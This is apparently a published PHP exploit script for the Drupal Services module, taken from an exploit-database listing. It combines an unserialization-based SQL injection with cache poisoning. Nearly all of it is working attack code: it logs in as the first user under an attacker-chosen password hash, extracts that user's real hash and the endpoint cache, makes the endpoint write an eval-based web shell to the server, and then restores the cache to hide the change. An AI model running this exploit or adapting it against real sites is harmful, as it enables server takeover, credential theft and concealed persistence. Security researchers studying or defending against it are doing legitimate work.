# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics 
# Website: https://www.ambionics.io/blog/drupal-services-module-rce
 
 
#!/usr/bin/php
<?php
# Drupal Services Module Remote Code Execution Exploit
# https://www.ambionics.io/blog/drupal-services-module-rce
# cf
#
# Three stages:
# 1. Use the SQL Injection to get the contents of the cache for current
endpoint
#    along with admin credentials and hash
# 2. Alter the cache to allow us to write a file and do so
# 3. Restore the cache
# 
 
# Initialization
 
error_reporting(E_ALL);
 
define(&#039;QID&#039;, &#039;anything&#039;);
define(&#039;TYPE_PHP&#039;, &#039;application/vnd.php.serialized&#039;);
define(&#039;TYPE_JSON&#039;, &#039;application/json&#039;);
define(&#039;CONTROLLER&#039;, &#039;user&#039;);
define(&#039;ACTION&#039;, &#039;login&#039;);
 
$url = &#039;http://vmweb.lan/drupal-7.54&#039;;
$endpoint_path = &#039;/rest_endpoint&#039;;
$endpoint = &#039;rest_endpoint&#039;;
 
$file = [
    &#039;filename&#039; => &#039;dixuSOspsOUU.php&#039;,
    &#039;data&#039; => &#039;<?php eval(file_get_contents(\&#039;php://input\&#039;)); ?>&#039;
];
 
$browser = new Browser($url . $endpoint_path);
 
 
# Stage 1: SQL Injection
 
class DatabaseCondition
{
    protected $conditions = [
        "#conjunction" => "AND"
    ];
    protected $arguments = [];
    protected $changed = false;
    protected $queryPlaceholderIdentifier = null;
    public $stringVersion = null;
 
    public function __construct($stringVersion=null)
    {
        $this->stringVersion = $stringVersion;
 
        if(!isset($stringVersion))
        {
            $this->changed = true;
            $this->stringVersion = null;
        }
    }
}
 
class SelectQueryExtender {
    # Contains a DatabaseCondition object instead of a SelectQueryInterface
    # so that $query->compile() exists and (string) $query is controlled by
us.
    protected $query = null;
 
    protected $uniqueIdentifier = QID;
    protected $connection;
    protected $placeholder = 0;
 
    public function __construct($sql)
    {
        $this->query = new DatabaseCondition($sql);
    }
}
 
$cache_id = "services:$endpoint:resources";
$sql_cache = "SELECT data FROM {cache} WHERE cid=&#039;$cache_id&#039;";
$password_hash = &#039;$S$D2NH.6IZNb1vbZEV1F0S9fqIz3A0Y1xueKznB8vWrMsnV/nrTpnd&#039;;
 
# Take first user but with a custom password
# Store the original password hash in signature_format, and endpoint cache
# in signature
$query = 
    "0x3a) UNION SELECT ux.uid AS uid, " .
    "ux.name AS name, &#039;$password_hash&#039; AS pass, " .
    "ux.mail AS mail, ux.theme AS theme, ($sql_cache) AS signature, " .
    "ux.pass AS signature_format, ux.created AS created, " .
    "ux.access AS access, ux.login AS login, ux.status AS status, " .
    "ux.timezone AS timezone, ux.language AS language, ux.picture " .
    "AS picture, ux.init AS init, ux.data AS data FROM {users} ux " .
    "WHERE ux.uid<>(0"
;
 
$query = new SelectQueryExtender($query);
$data = [&#039;username&#039; => $query, &#039;password&#039; => &#039;ouvreboite&#039;];
$data = serialize($data);
 
$json = $browser->post(TYPE_PHP, $data);
 
# If this worked, the rest will as well
if(!isset($json->user))
{
    print_r($json);
    e("Failed to login with fake password");
}
 
# Store session and user data
 
$session = [
    &#039;session_name&#039; => $json->session_name,
    &#039;session_id&#039; => $json->sessid,
    &#039;token&#039; => $json->token
];
store(&#039;session&#039;, $session);
 
$user = $json->user;
 
# Unserialize the cached value
# Note: Drupal websites admins, this is your opportunity to fight back :)
$cache = unserialize($user->signature);
 
# Reassign fields
$user->pass = $user->signature_format;
unset($user->signature);
unset($user->signature_format);
 
store(&#039;user&#039;, $user);
 
if($cache === false)
{
    e("Unable to obtains endpoint&#039;s cache value");
}
 
x("Cache contains " . sizeof($cache) . " entries");
 
# Stage 2: Change endpoint&#039;s behaviour to write a shell
 
class DrupalCacheArray
{
    # Cache ID
    protected $cid = "services:endpoint_name:resources";
    # Name of the table to fetch data from.
    # Can also be used to SQL inject in DrupalDatabaseCache::getMultiple()
    protected $bin = &#039;cache&#039;;
    protected $keysToPersist = [];
    protected $storage = [];
 
    function __construct($storage, $endpoint, $controller, $action) {
        $settings = [
            &#039;services&#039; => [&#039;resource_api_version&#039; => &#039;1.0&#039;]
        ];
        $this->cid = "services:$endpoint:resources";
 
        # If no endpoint is given, just reset the original values
        if(isset($controller))
        {
            $storage[$controller][&#039;actions&#039;][$action] = [
                &#039;help&#039; => &#039;Writes data to a file&#039;,
                # Callback function
                &#039;callback&#039; => &#039;file_put_contents&#039;,
                # This one does not accept "true" as Drupal does,
                # so we just go for a tautology
                &#039;access callback&#039; => &#039;is_string&#039;,
                &#039;access arguments&#039; => [&#039;a string&#039;],
                # Arguments given through POST
                &#039;args&#039; => [
                    0 => [
                        &#039;name&#039; => &#039;filename&#039;,
                        &#039;type&#039; => &#039;string&#039;,
                        &#039;description&#039; => &#039;Path to the file&#039;,
                        &#039;source&#039; => [&#039;data&#039; => &#039;filename&#039;],
                        &#039;optional&#039; => false,
                    ],
                    1 => [
                        &#039;name&#039; => &#039;data&#039;,
                        &#039;type&#039; => &#039;string&#039;,
                        &#039;description&#039; => &#039;The data to write&#039;,
                        &#039;source&#039; => [&#039;data&#039; => &#039;data&#039;],
                        &#039;optional&#039; => false,
                    ],
                ],
                &#039;file&#039; => [
                    &#039;type&#039; => &#039;inc&#039;,
                    &#039;module&#039; => &#039;services&#039;,
                    &#039;name&#039; => &#039;resources/user_resource&#039;,
                ],
                &#039;endpoint&#039; => $settings
            ];
            $storage[$controller][&#039;endpoint&#039;][&#039;actions&#039;] += [
                $action => [
                    &#039;enabled&#039; => 1,
                    &#039;settings&#039; => $settings
                ]
            ];
        }
 
        $this->storage = $storage;
        $this->keysToPersist = array_fill_keys(array_keys($storage), true);
    }
}
 
class ThemeRegistry Extends DrupalCacheArray {
    protected $persistable;
    protected $completeRegistry;
}
 
cache_poison($endpoint, $cache);
 
# Write the file
$json = (array) $browser->post(TYPE_JSON, json_encode($file));
 
 
# Stage 3: Restore endpoint&#039;s behaviour
 
cache_reset($endpoint, $cache);
 
if(!(isset($json[0]) && $json[0] === strlen($file[&#039;data&#039;])))
{
    e("Failed to write file.");
}
 
$file_url = $url . &#039;/&#039; . $file[&#039;filename&#039;];
x("File written: $file_url");
 
 
# HTTP Browser
 
class Browser
{
    private $url;
    private $controller = CONTROLLER;
    private $action = ACTION;
 
    function __construct($url)
    {
        $this->url = $url;
    }
 
    function post($type, $data)
    {
        $headers = [
            "Accept: " . TYPE_JSON,
            "Content-Type: $type",
            "Content-Length: " . strlen($data)
        ];
        $url = $this->url . &#039;/&#039; . $this->controller . &#039;/&#039; . $this->action;
 
        $s = curl_init(); 
        curl_setopt($s, CURLOPT_URL, $url);
        curl_setopt($s, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($s, CURLOPT_POST, 1);
        curl_setopt($s, CURLOPT_POSTFIELDS, $data);
        curl_setopt($s, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($s, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($s, CURLOPT_SSL_VERIFYPEER, 0);
        $output = curl_exec($s);
        $error = curl_error($s);
        curl_close($s);
 
        if($error)
        {
            e("cURL: $error");
        }
 
        return json_decode($output);
    }
}
 
# Cache
 
function cache_poison($endpoint, $cache)
{
    $tr = new ThemeRegistry($cache, $endpoint, CONTROLLER, ACTION);
    cache_edit($tr);
}
 
function cache_reset($endpoint, $cache)
{
    $tr = new ThemeRegistry($cache, $endpoint, null, null);
    cache_edit($tr);
}
 
function cache_edit($tr)
{
    global $browser;
    $data = serialize([$tr]);
    $json = $browser->post(TYPE_PHP, $data);
}
 
# Utils
 
function x($message)
{
    print("$message\n");
}
 
function e($message)
{
    x($message);
    exit(1);
}
 
function store($name, $data)
{
    $filename = "$name.json";
    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
    x("Stored $name information in $filename");
}

